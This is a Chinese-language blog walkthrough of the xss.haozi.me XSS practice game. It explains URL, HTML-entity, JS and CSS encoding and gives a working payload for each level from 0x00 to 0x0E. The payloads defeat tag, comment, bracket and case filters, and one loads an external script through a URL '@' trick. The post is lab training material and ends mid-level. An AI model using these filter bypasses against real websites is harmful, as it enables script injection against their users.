xss.haozi练习

Intro
2018-12-03

前言最近发现一个有意思的XSS练习平台，通过这个游戏不仅可以加深对XSS的理解，而且通过游戏的形式让学习更有趣味性，给个地址0x00从源码中可以发现题目没有对输入进行任何操作，所以构造payload:script>alert(1)</script>
0x01这一关是在<textarea>标签中，所以可以先闭合掉前面的标签，payload:</textarea><img src=# onerror=alert(1)>
0x02这里的源码得知输入的值被包裹在""中，于是尝试闭合掉双引号，但是并没有奏效，而后发现应该将input标签全部闭合才可执行我们想要的代码，所以payload为："><script>alert(1)</script>
0x03常见的编码方法

  • URL编码：百分号加该字符的ASCII码对应的两位十六进制数字，例如/的URL编码为%2F

  • HTML实体编码：十进制、十六进制的ASCII码或者unicode字符编码，例如<的编码为&#060；和&#x3c;

  • JS编码：js提供了四种字符编码的策略
    1 2 3 4 1. 三个八进制数字，不够个数的在前面补0：e -> \145 2. 两个十六进制数字，不够的补0：e -> \x65 3. 四个十六进制数字，不够的补0：e -> \u0065 4. 一些控制字符，使用C类型的转义风格：\n \r

  • CSS编码：用一个反斜线\后面加1-6位十六进制数字，例如e编码为\65、65、00065

  • 复合编码：也就是输出的内容在多个环境中
    1 <td onclick=”openUrl(add.do?userName=’<%=value%>’);”>11</td>

这里value的内容首先在url中，而url在一段javascript中，javascript又是html的一部分，所以解码的顺序为HTML解码->js解码->url解码，那么编码顺序就为反基本概念HTML解析器能识别在文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明的对这些编码进行解码
例如下面两种写法的功能是一样的：
1 2 <img src="http://www.example.com"> <img src="ht&#x74;p&#x3a;//www.example.com">

但下面两个例子却没法加载图片，因为编码干扰了标签本身的结构
1 2 <img src&# x3d;"http://www.example.com"> <img s&#x72;c="http://www.example.com">

浏览器解析HTML的步骤：收到服务器发送来的HTML内容。从头解析，遇到<script></script>时，调用JavaScript脚本解析器解析并执行脚本，然后继续解析HTML内容，对于需要触发才能执行的事件，当触发事件发送时，脚本解析器才会解析其中的脚本，在事件触发之前，他是HTML的一部分回到题目从源码中可以看到输入过滤掉了()，而且输入值$input只在html环境中，浏览器
1 2 3 4 5 function render (input) { const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, '') return input }

所以尝试将输入值<script>alert(1)</script>进行HTML编码，从而可以绕过过滤，emmm并没有成功，于是尝试img标签，成功绕过
payload:<img src=# onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
网上看到一个payload，涨知识系列：
1 <img src=# onerror=alert`1`>

0x04这里过滤了()和前面提到的反单引号，所以还是可以通过对HTML编码绕过，payload：<img src=# onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
0x05这里过滤了-->是注释符的结尾，查阅资料后发现注释符的闭合符有两种：
1 2 <!-- XXX --> <!- XXX --!>

所以我们用第二种注释符，payload：--!><script>alert(1)</script>
0x06这里过滤了auto、on.*=、>，所以想构造<srcipt>是不成功的，再看题目是在input标签注入，可以使用onclick、onmousemove等属性，这里我们尝试onclick=alert(1)，题目这里的正则是可以过滤的，因为on.*=这里的点是不会匹配换行符的，所以payload：
1 2 onclick =alert(1)

0x07这里的正则过滤了以<或</开头和以>结尾的字符串。利用容错性不闭合>，构造<img src=# onerror="alert(1)"或者<img src=# onerror=alert(1) CRLF结尾
0x08这里将</style>过滤掉了，但是我们可以加个空格绕过，payload：</style ><script>alert(1)</script>
0x09源码要求以http://www.segmentfault.com开头但是并没有限制结尾，所以闭合掉<script>标签，payload：http://www.segmentfault.com"></script><img src=# onerror="alert(1)
0x0A从源码可知过滤了&不能实体编码绕过，过滤了<,>，不能闭合标签

这里利用url的@特性，引入外部js,假设我们访问http://example.com@10.10.10.10，实际上是http://10.10.10.10,这里的\会被过滤，过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析，所以payload：https://www.segmentfault.com@xss.haozi.me/j.js
0x0BtoUpperCase()函数将字符转换成大写，这里两种方法

  • HTML不区分大小写
  • Javascript严格区分大小写
    第一种方法在<script>标签中的src添加，payload：<script src="https://xss.haozi.me/j.js"></script>
    第二种方法将js的代码html实体编码绕过
    <img src=# onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

0x0C这里过滤掉了script，所以上一个的第一种方法就不行，直接用第二种，payload：<img src=# onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
0x0D这里过滤掉了< / " '，而且input在注释符//后，这里可以利用换行来逃逸，但是后面的')不知道怎么过滤掉，查阅资料后发现可以用-->注释掉后面的内容,payload:
1 2 3 ) alert(1) -->

0x0E这里对<字母开头的字符串转换成<_字母并大写，所以基本上所有的标签都被过滤掉了，查阅资料发现阿拉伯字母ſ大写为S，但是本身又不是字母，太BUG了吧，长见识了
